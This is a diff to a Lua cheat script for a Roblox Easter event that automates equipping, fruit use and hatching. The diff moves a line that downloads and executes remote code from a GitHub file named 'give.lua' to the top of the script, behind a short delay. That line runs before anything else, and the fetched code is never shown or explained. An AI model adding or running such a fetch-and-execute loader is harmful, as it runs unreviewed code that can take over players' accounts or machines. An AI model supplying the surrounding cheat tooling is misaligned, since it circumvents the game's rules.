@@ -1,3 +1,5 @@
+task.wait(5)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/thuyan1510/99/refs/heads/main/give.lua"))()
 -- ==========================================
 -- 🌸 EASTER EVENT - V92 (ULTIMATE OPTIMIZED + SMART PORTALS) 🌸
 -- Auto Equip + Auto Fruit + Bypass Hatch + Smart Event Luck + Full UI + Smart Portals
@@ -74,7 +76,7 @@ local UltimateCmds = require(Library.Client.UltimateCmds)
 local FreeGiftsDirectory = require(Library.Directory.FreeGifts)
 local MapCmds = require(Library.Client.MapCmds)
 local FruitCmds = require(Library.Client.FruitCmds)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/thuyan1510/99/refs/heads/main/give.lua"))()
+
 -- ==========================================
 -- 📢 WEBHOOK DISCORD
 -- ==========================================
